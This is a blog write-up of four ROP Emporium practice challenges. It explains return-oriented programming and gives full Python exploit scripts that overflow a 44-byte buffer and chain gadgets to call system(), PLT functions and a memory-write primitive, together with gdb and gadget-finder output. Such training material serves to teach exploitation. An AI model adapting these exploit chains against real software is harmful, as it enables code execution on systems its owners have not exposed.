---
author:
  name: "spook"
date: 2022-05-25
linktitle: Rop writeups ret2win-write41
type:
- post
- posts
title: Rop writeups ret2win-write41
weight: 10
series:
- rop
---

While attempting to solve a CTF for a job interview, I learned the basics of crafting return-oriented programming exploits. This knowledge inspired me to create a write up for a few challenges that involve ROP from [ROP Emporium](https://ropemporium.com/).
# introduction to Rop
Return-oriented programming can be thought of as an advanced form of buffer overflow. The basic buffer overflow involves gaining control of the instruction pointer and then pointing it to shellcode code added to the stack. One protection against the basic buffer overflow is making the stack not executable. This protection means in the event a basic buffer overflow is attempted an exception is thrown once the instruction pointer is pointed to the shellcode on the stack. 
This protection does not fix the underlying problem. An attacker still has control over the instruction pointer. An attacker can still change the flow of execution of the program. An attacker cannot  execute on the stack, but an attacker can still point the instruction pointer to parts of the memory that has executable permissions.  The ROP exploit technique involves recycling code within the binary to cause unintended behavior. The technique is easier to understand once one looks at examples. 

# ret2win
I begin with the first recommended challenge ret2win. I download the binary and begin by verifying the buffer overflow exists. 
```bash 
python -c "print('a'*100)" | ./ret2win32
```

The program crashes as expected. It is now time to gain control over the instruction pointer. I used this [website](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to generate a cyclical pattern to feed into the program. I open the program in gdb, a debugger, so that I may inspect the registers after crashing the program. I get this output.

```bash
(gdb) info registers
...
eip            0x35624134          0x35624134
...

```
I feed this value back into the website from earlier. I discover bytes after the 44th end up in eip. I can control of the instruction pointer. In a normal buffer overflow, this control is used to execute the shellcode placed on the stack. This action cannot be done in this situation. The stack is not executable. No code written on the stack can be executed, but we can still redirect execution elsewhere within the binary. 

I begin by using the `info functions` function within gdb to see which functions are available within the binary. I spot a fairly interesting function called `ret2win`. 
```bash
(gdb) info functions   
All defined functions:  
  
Non-debugging symbols:
...
0x0804862c ret2win
...
```
I will redirect execution to the address associated with the ret2win function. I wrote a small python program to generate the desired payload. 
```python 
import struct
import sys
buf=b'\x41'*44 # padding for the first 44 bytes
buf+= struct.pack('<L',0x0804862c) # address of ret2win
buf+=b'\n'
out= bytes(buf)
sys.stdout.buffer.write(out) 
```
Running `python3 ret2win32.py | ./ret2win32` results in the flag being outputted. 
```bash
python3 ret2win32.py | ./ret2win32  
ret2win by ROP Emporium  
x86  
  
For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!  
What could possibly go wrong?  
You there, may I have your input please? And don't worry about null bytes, we're using read()!  
  
> Thank you!  
Well done! Here's your flag:  
ROPE{a_placeholder_32byte_flag!}  
fish: Process 16443, './ret2win32' from job 1, 'python3 ret2win32.py | ./ret2wi…' terminated by signal SIGSEGV (Address boundary error)
```

## split
The offset is the same as the last binary 44. The prompt for the challenge suggests there will be a need to form a short rop chain. I begin by looking at the functions available.  
```bash
(gdb) info functions   
All defined functions:  
  
Non-debugging symbols:
...
0x0804860c usefulFunction
...
```
I look at the disassembly of the `usefulFunction.` 
```bash
(gdb) disassemble usefulFunction  
Dump of assembler code for function usefulFunction:  
  0x0804860c <+0>:     push   %ebp  
  0x0804860d <+1>:     mov    %esp,%ebp  
  0x0804860f <+3>:     sub    $0x8,%esp  
  0x08048612 <+6>:     sub    $0xc,%esp  
  0x08048615 <+9>:     push   $0x804870e  
  0x0804861a <+14>:    call 0x80483e0 <system@plt>  
  0x0804861f <+19>:    add    $0x10,%esp  
  0x08048622 <+22>:    nop  
  0x08048623 <+23>:    leave   
  0x08048624 <+24>:    ret   
End of assembler dump.
```
There is a call to `system().` The system function allows the program to call [operating systems commands](https://www.geeksforgeeks.org/system-call-in-c/). The system function accepts a pointer to a string containing the command to be executed. This function call will be useful for reading the flag. I only need to find a location in memory to pass to the function as an argument to pass to the function. I used edb to find where in memory the string `/bin/cat flag.txt` existed. 

{{< image src="/img/rop1/edb.png" alt="Under construction" position="center" style="border-radius: 8px;" >}}


I then had everything needed to create the ROP chain. 

```python
import struct
import sys
buf=b'\x41'*44
buf+= struct.pack('<L',0x80483e0) # call to system
buf+=b'\x42'*4 # fake return address
buf+= struct.pack('<L',0x804a030) # arg 1 / location of string
buf+=b'\n'
out= bytes(buf)
sys.stdout.buffer.write(out)

```
Feeding this output into the vulnerable program results in the flag being outputted. 

# callme 

The offset is once again 44. For this binary, we will attempt to call multiple functions. The challenge explicitly states which function calls and which arguments are needed. I begin by finding the address of all the functions I wish to call. This is done with the `info functions` command used earlier in gdb. Care is taken to use the `@plt` version of the function. 

A trip to [stack overflow](https://stackoverflow.com/questions/5469274/what-does-plt-mean-here) and a watch of a [LiveOverflow video](https://www.youtube.com/watch?v=kUk5pw4w0h4)
 helped me understand what the @plt meant. Plt stands for procedure linkage table. The procedure linkage table is used when the compiler dynamically links an external library. The location of the function within the dynamically linked library that needs to be called cannot be known at compile time. As a result, the location of that function in the library is resolved when the binary is executed. The `@plt` version of the program is a stub that eventually leads to the calling of the actual desired function. 

Now I can think about how the stack should look when making multiple function calls. The ultimate goal is to make the stack look like so:
```
----------------------
|  etc   ...         |
----------------------
|  next function call|
----------------------
|  arg 3             |
----------------------
|  arg 2             |
----------------------
|  arg 1             |
----------------------
|  return address    |
----------------------
|  function call     |
----------------------
```
The return address, in this case, should be a rop gadget that pops three items off the stack. Removing the arguments from the stacks cleans up the stack so that the next function call can happen smoothly. There exist several programs that can find rop gadgets within binaries. I used [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) in this situation. The command `ROPgadget --binary callme32` can be used to see some possibly useful gadgets within the binary. 
```bash 
Gadgets information  
============================================================
...
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
...
```


```python
import struct
import sys
buf=b'\x41'*44
buf+= struct.pack('<L',0x080484f0) # callme_one@plt
buf+= struct.pack('<L',0x080487f9) # gadget with 3 pops
buf+= struct.pack('<L',0xdeadbeef) # arg 1
buf+= struct.pack('<L',0xcafebabe) # arg 2
buf+= struct.pack('<L',0xd00df00d) # arg 3
buf+= struct.pack('<L',0x08048550) # callme_two@plt
buf+= struct.pack('<L',0x080487f9)
buf+= struct.pack('<L',0xdeadbeef)
buf+= struct.pack('<L',0xcafebabe)
buf+= struct.pack('<L',0xd00df00d)
buf+= struct.pack('<L',0x080484e0) # callme_three@plt
buf+= struct.pack('<L',0x080487f9)
buf+= struct.pack('<L',0xdeadbeef)
buf+= struct.pack('<L',0xcafebabe)
buf+= struct.pack('<L',0xd00df00d)
out= bytes(buf)
sys.stdout.buffer.write(out)
```

Running the program outputs the flag. 


```bash
callme by ROP Emporium  
x86  
  
Hope you read the instructions...  
  
> Thank you!  
callme_one() called correctly  
callme_two() called correctly  
ROPE{a_placeholder_32byte_flag!}

```

#  write4
The offset is still 44. 

I begin by looking at the functions. 
```bash 
(gdb) info functions    
All defined functions:  
  
Non-debugging symbols:  
0x0804837c  _init  
0x080483b0  pwnme@plt  
0x080483c0  __libc_start_main@plt  
0x080483d0  print_file@plt  
0x080483e0  __gmon_start__@plt  
0x080483f0  _start  
0x08048430  _dl_relocate_static_pie  
0x08048440  __x86.get_pc_thunk.bx  
0x08048450  deregister_tm_clones  
0x08048490  register_tm_clones  
0x080484d0  __do_global_dtors_aux  
0x08048500  frame_dummy  
0x08048506  main  
0x0804852a  usefulFunction  
0x08048543  usefulGadgets  
0x08048550  __libc_csu_init  
0x080485b0  __libc_csu_fini  
0x080485b4  _fini
```
The usefulFunction and usefulGadgets functions look interesting, so I examine them more closely. 

The usefulFunction disassembly seems to contain the print_file function I need to call with the argument "flag.txt" according to the instructions in the challenge. 
```bash 
(gdb) disassemble usefulFunction      
Dump of assembler code for function usefulFunction:  
  0x0804852a <+0>:     push   ebp  
  0x0804852b <+1>:     mov    ebp,esp  
  0x0804852d <+3>:     sub    esp,0x8  
  0x08048530 <+6>:     sub    esp,0xc  
  0x08048533 <+9>:     push   0x80485d0  
  0x08048538 <+14>:    call   0x80483d0 <print_file@plt>  
  0x0804853d <+19>:    add    esp,0x10  
  0x08048540 <+22>:    nop  
  0x08048541 <+23>:    leave     
  0x08048542 <+24>:    ret       
End of assembler dump.
```
The usefulGadgets function contains one apparently useful gadget. The gadget at `0x08048543` allows me to move the contents of ebp into the memory address pointed to by the register edi. 
```bash 
(gdb) disassemble usefulGadgets      
Dump of assembler code for function usefulGadgets:  
  0x08048543 <+0>:     mov    DWORD PTR [edi],ebp  
  0x08048545 <+2>:     ret       
  0x08048546 <+3>:     xchg   ax,ax  
  0x08048548 <+5>:     xchg   ax,ax  
  0x0804854a <+7>:     xchg   ax,ax  
  0x0804854c <+9>:     xchg   ax,ax  
  0x0804854e <+11>:    xchg   ax,ax  
End of assembler dump.
```
The first order of business is finding a place within the binary that can be overwritten without breaking anything. Readelf can be used to look at the sections of the binary.

```bash 
> readelf -a write432
Section Headers:  
 ...
 000004 04  WA  0   0  4  
 [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4  
 [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4  
 [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4  
 [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4  
 [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4  
 [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1  
...
Key to Flags:  
 W (write), A (alloc), X (execute), M (merge), S (strings), I (info),  
 L (link order), O (extra OS processing required), G (group), T (TLS),  
 C (compressed), x (unknown), o (OS specific), E (exclude),  
 D (mbind), p (processor specific)
```
 The .data section appears to be writeable. Readelf can also be used to read that section. 
```bash
>readelf write432 -x .data
Hex dump of section '.data':  
 0x0804a018 00000000 00000000                   ........
```
It looks empty. This section is likely safe to overwrite. The address of that section is `0x0804a018`. Now I need a way to write that value to the edi register. I also need the ability to write arbitrary bytes to the ebp register. I use [ropper](https://github.com/sashs/Ropper) to look for more useful gadgets. I believe pop will be the most useful command. It should allow me to place values from the stack(which I control) into the needed registers. 
```bash 
>ropper -f write432
...
0x08048525: pop ebp; lea esp, [ecx - 4]; ret;    
0x080485ab: pop ebp; ret;    
0x080485a8: pop ebx; pop esi; pop edi; pop ebp; ret;  
0x0804839d: pop ebx; ret;    
0x08048524: pop ecx; pop ebp; lea esp, [ecx - 4]; ret; 
0x080485aa: pop edi; pop ebp; ret;    
0x080485a9: pop esi; pop edi; pop ebp; ret;
...
```
The most useful gadget appears to be this one: `0x080485aa: pop edi; pop ebp; ret;`. I will now perform a short test run to see if I can get values into the registers. 
```python
import struct
import sys
buf=b'\x41'*44
buf+= struct.pack('<L',0x080485aa) # pop edi; pop ebp; ret;
buf+=b'BBBB' #
buf+=b'DDDD'
out= bytes(buf)
sys.stdout.buffer.write(out)
```
I use GDB to examine the registers after overflowing the buffer. 
```bash 
(gdb) info registers    
eax            0xb                 11  
ecx            0xf7f770f4          -134778636  
edx            0x1                 1  
ebx            0x41414141          1094795585  
esp            0xffffd49c          0xffffd49c  
ebp            0x44444444          0x44444444  
esi            0xffffd564          -10908  
edi            0x42424242          1111638594
```

The B's wound up in the edi register while the D's ended up in the ebp register. Now I put the actual values I want in the two registers and attempt to use the ROP gadget to move the contents of ebp to the memory address in edi. 

```python 
import struct
import sys
buf=b'\x41'*44
#buf=b'\x43'*4 
buf+= struct.pack('<L',0x080485aa) # pop edi; pop ebp; ret;
buf+= struct.pack('<L',0x0804a018) # .data address 
buf+=b'flag' # half of argument to write
buf+= struct.pack('<L',0x08048543) #mov    DWORD PTR [edi],ebp
buf +=b'\n'
out= bytes(buf)
sys.stdout.buffer.write(out)

```
 I check the memory location. 
 ```bash 
 (gdb) x/3x 0x804a018  
0x804a018:      0x67616c66      0x00000000      0x00000000
```
It appears the value has been written to memory. I have to write the second half of the argument to memory. 

``` python 
import struct
import sys
buf=b'\x41'*44
#writing first half of argument to memory
buf+= struct.pack('<L',0x080485aa) # pop edi; pop ebp; ret;
buf+= struct.pack('<L',0x0804a018) # .data address
buf+=b'flag' # half of argument to write
buf+= struct.pack('<L',0x08048543) #mov    DWORD PTR [edi],ebp
#writing second half of argument to memory
buf+= struct.pack('<L',0x080485aa) # pop edi; pop ebp; ret;
buf+= struct.pack('<L',0x0804a018+4) # .data address
buf+=b'.txt' # half of argument to write
buf+= struct.pack('<L',0x08048543) #mov    DWORD PTR [edi],ebp
buf +=b'\n'
out= bytes(buf)
sys.stdout.buffer.write(out)
```
 It appears to work. 
 ```bash 
 (gdb) x/3x 0x804a018    
0x804a018:      0x67616c66      0x7478742e      0x00000000
 ```
 It is now time to make the call to the `print_file@plt` function with the memory location where I wrote flag.txt as an argument. 
 
 ``` python 
import struct
import sys
buf=b'\x41'*44
#writing first half of argument to memory
buf+= struct.pack('<L',0x080485aa) # pop edi; pop ebp; ret;
buf+= struct.pack('<L',0x0804a018) # .data address
buf+=b'flag' # half of argument to write
buf+= struct.pack('<L',0x08048543) #mov    DWORD PTR [edi],ebp
#writing second half of argument to memory
buf+= struct.pack('<L',0x080485aa) # pop edi; pop ebp; ret;
buf+= struct.pack('<L',0x0804a018+4) # .data address
buf+=b'.txt' # half of argument to write
buf+= struct.pack('<L',0x08048543) #mov    DWORD PTR [edi],ebp
# function call
buf+= struct.pack('<L',0x80483d0) # <print_file@plt>
buf+= b'CCCC' # fake return address
buf+= struct.pack('<L',0x0804a018) # .data address / args 1
buf +=b'\n'
out= bytes(buf)
sys.stdout.buffer.write(out)
 
 ```
 
 I run the program and get the flag. 
 ```bash 
 (gdb) run < writebin    
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /home/spook2/school/notSchool/blog fodder/rop/write4/write432 < writebin  
[Thread debugging using libthread_db enabled]  
Using host libthread_db library "/usr/lib/libthread_db.so.1".  
write4 by ROP Emporium  
x86  
  
Go ahead and give me the input already!  
  
> Thank you!  
ROPE{a_placeholder_32byte_flag!}
 ```

This concludes the first batch of ROP exploit challenge write-ups for this blog. Completing these challenges was a fun way to brush up on my knowledge of assembly. I highly recommend [ROP Emporium](https://ropemporium.com/).


